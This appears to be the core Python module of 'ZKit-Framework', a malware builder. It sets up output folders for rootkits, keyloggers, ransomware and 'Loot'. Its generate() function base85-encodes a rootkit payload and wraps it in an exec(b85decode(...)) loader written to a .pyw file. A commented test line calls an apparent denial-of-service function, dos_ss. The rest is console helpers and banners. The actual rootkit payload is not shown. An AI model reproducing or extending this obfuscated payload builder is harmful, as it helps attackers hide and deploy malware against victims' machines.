"""
The Core Module of ZKit-Framework Contains : some useful methods like a custom create_file

"""
# Python 2 is supported too
from __future__ import print_function, division, absolute_import
import os


def Check():
    if os.name == 'nt':
        try:
            import colorama
        except (ImportError, ModuleNotFoundError):
            raise SystemExit(
                "Colorama Not Found . Install It Via Pip (pip install colorama)")

    try:
        import scapy
    except(ImportError, ModuleNotFoundError):
        raise SystemExit(
            "Scapy Not Found . Install It Via Pip (pip install scapy)")
    return True


def init():

    PATH = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
    rootkit_path = PATH + "\\Builded\\Rootkit\\"
    keylogger_path = PATH + "\\Builded\\KeyLogger\\"
    ransomware_path = PATH + "\\Builded\\Ransomware\\"
    os.popen("mkdir {}".format(rootkit_path)).close()
    os.popen("mkdir {}".format(keylogger_path)).close()
    os.popen("mkdir {}".format(ransomware_path)).close()
    os.popen("mkdir {}".format(PATH + '\\Loot')).close()
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


class Color:
    def __init__(self):
        self.colors = {
            "black": "\033[30m",
            "red": "\033[31m",
            "green": "\033[32m",
            "yellow": "\033[33m",
            "blue": "\033[34m",
            "magenta": "\033[35m",
            "cyan": "\033[36m",
            "grey": "\033[37m",
            "reset": "\033[0m",
        }

    def GetColor(self, colorname):
        return self.colors.get(colorname)

    def GetAllColors(self):
        return tuple(self.colors.values())


def notify(status: str, message: str, ending="\n", flush=False):
    """
    notifies the user with given parameters . you can customize it very well

    Args:
        message (str): message shown for the user
        status (str): status for event . all possibleties are "notify", "problem", "report" and "question"
        statuses will be converted to lower .
        ending (str): used as value for print(message, end = ending)
        flush (bool): to flush the stream or not (default=False)
    """
    c = Color()
    reset = c.GetColor('reset')
    status = status.lower()
    all_status = {'report': 'blue|[ REPORT ]',
                  'notify': 'green|[ NOTIFY ]',
                  'problem': 'red|[CRITICAL]',
                  'question': 'yellow|[QUESTION]',
                  }
    for st in all_status:
        if st == status:
            temp = all_status[st].split('|')
            first = c.GetColor(temp[0]) + temp[1] + reset
            break
    print("{}{} {}".format(
          '\r' if flush else '', first, message), end=ending)


def ask_for(message: str, report: str, default=['', ''], type=str, args=()):
    """
    Asks for anything from users . (uses notify)

    Args:
        message (str): message to show the user to ask for details .
        report (str): message to show user that your data is correct .
        default (list): default value and action for that if callable calls it with the arguments
        else replaces it with default[1] . (Default = ['', '']).
        type (type): type of data to apply to input. (Default : str)
        args (tuple): [description]. Defaults to ().

    Returns:
        (type): the value user entered in type of the "type" argument. changed if matched the default to whatever to put in defaults[1]
    """
    notify('question', message, '')
    if type != list:
        value = type(input(""))
    elif type == list:
        value = str(input("")).split()

    if value == default[0]:
        if callable(default[1]):
            if args == ("DEFAULT"):
                value = default[1](value)
            elif args is None or args == ():
                value = default[1]()
            else:
                value = default[1](args)
        else:
            value = default[1]
    notify('report', report.replace('\\|', str(value), 1))
    return value


def create_file(file: str):
    """
    Creates A New file if a file is on the given path if exists asks for overwrite permission
    if yes clears file data then closes it if no asks for another file path

    Arguments:
        file (str) : Path to File to create if exists asks for overwriting permission

    Returns A Path if file created returns file path if not returns asked file path
    or returns none if got wrong answer at the YES or NO overwrite permission ask
    """
    notify("notify", "Creating File...", "")
    try:
        _ = open(file,  "x").close()
    except FileExistsError:
        notify(
            "problem", "Creating File...Failed \nFile Already Exists Confirm Overwrite : (N or Y) ", "", True
        )
        choice = str(input("")).upper()
        if choice == "Y":
            pass
        elif choice == "N":
            file = str(input("Write Down File Name Here : ")) + ".pyw"
        else:
            notify("problem", "\nInvalid Input Try Again")
            while True:
                notify("File Already Exists Confirm Overwrite : (N or Y) ", "")
                choice = str(input("")).upper()
                if choice == "Y":
                    break
                elif choice == "N":
                    file = str(
                        input("Write Down File Name Here : ")) + ".pyw"
                    break
                else:
                    notify("problem", "\nInvalid Input Try Again")
    else:
        notify("report",
               "Creating File...Done ", "\n", True)
    return file


def generate(payload_type):
    from base64 import b85encode as be, b85decode as bd
    from core.helper_core import get_rootkit
    if payload_type == "rootkit":
        payload, path = get_rootkit()
    notify("notify", "Opening File To Write Data On It...", "")
    try:
        f = open(path, "w+")
    except:
        notify(
            "problem", "Opening File To Write Data On It...Failed \n Cannnot Open File", "\n", True)
        return
    else:
        notify("report",
               "Opening File To Write Data On It...Done", "\n", True)
    notify("notify", "Encrypting Data Before Writing On File...", "")
    payload = be(payload.encode("UTF-8")).decode("UTF-8")
    notify("report",
           "Encrypting Data Before Writing On File...Done", "\n", True)
    payload = 'from base64 import b85decode\nvalue = """' + \
        payload + '"""\nexec(b85decode(value))'
    notify("notify", "Writing Data On File...", "")
    try:
        f.write(payload)
    except PermissionError:
        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . Looks Like "
               "You Dont Have Access To The File." "\n", True)
    except:
        notify("problem", "Writing Data On File...Failed \nSomething Went Wrong . Is Another Process "
               "Using It ? ", "\n", True)
        notify("problem", "Couldnt Write Data On File Closing File...", "")
        f.close()
        print("Done")
    else:
        notify("report",
               "Writing Data On File...Done", "\n", True)
        notify("report",
               "Operation was successful")


def print_banner():
    from core.helper_core._banners import banner1, banner2
    import random
    black, red, green, yellow, blue, magenta, cyan, grey, reset = Color().GetAllColors()
    random.seed(random.choice(
        [random.randint(1, 9999), random.randint(1, 998)]))
    banner = random.choice([banner1, banner2])
    color = random.choice([red, green, blue, magenta, cyan])
    print(color + banner + reset)


if __name__ == "__main__":
    print("Dont Run This File")
# Used For Test
# dos_ss("192.168.1.1", "127.0.0.1", 110 , 80 , 1, "Test")
